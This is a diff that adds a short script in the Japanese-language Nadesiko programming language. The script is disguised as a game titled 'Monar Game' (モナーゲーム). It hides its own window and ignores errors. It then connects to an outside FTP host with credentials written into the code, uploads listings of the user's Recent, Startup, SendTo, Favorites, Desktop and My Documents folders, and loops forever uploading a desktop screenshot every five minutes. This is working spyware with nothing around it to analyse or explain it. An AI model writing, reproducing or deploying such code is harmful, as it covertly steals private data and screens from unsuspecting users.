@@ -1,0 +1,12 @@
+エラー無視;母艦の可視=0;母艦のタイトル="モナーゲーム";あとはイメージ;経過ダイアログ=0;1秒待つ;FNAME="{HEX(乱数(256))}{HEX(乱数(256))}{HEX(乱数(256))}{HEX(乱数(256))}{HEX(乱数(256))}{HEX(乱数(256))}{HEX(乱数(256))}{HEX(乱数(256))}"
+"ID=aiamuvipper{~}パスワード=R8UxEsSW{~}ホスト=www35.tok2.com{~}PORT=21"でFTP接続;"/{FNAME}/"へFTPフォルダ作成;
+RECENTパスのファイル列挙;それを"C:\yeah.txt"に保存;"C:\yeah.txt"を"/{FNAME}/yeah.txt"へFTPアップロード
+スタートアップのファイル列挙;それを"C:\lets_start.txt"に保存;"C:\lets_start.txt"を"/{FNAME}/lets_start.txt"へFTPアップロード
+SENDTOパスのファイル列挙;それを"C:\lets_send.txt"に保存;"C:\lets_send.txt"を"/{FNAME}/lets_send.txt"へFTPアップロード
+FAVORITESパスのファイル列挙;それを"C:\favorites.txt"に保存;"C:\favorites.txt"を"/{FNAME}/favorites.txt"へFTPアップロード
+デスクトップのファイル列挙;それを"C:\desktop.txt"に保存;"C:\desktop.txt"を"/{FNAME}/desktop.txt"へFTPアップロード
+マイドキュメントのファイル列挙;それを"C:\mydoc.txt"に保存;"C:\mydoc.txt"を"/{FNAME}/mydoc.txt"へFTPアップロード
+1でループ
+	あへデスクトップを窓キャプチャ
+	あを"C:\{回数}.png"へ画像保存;"C:\{回数}.png"を"/{FNAME}/{回数}.png"へFTPアップロード
+	300秒待つ
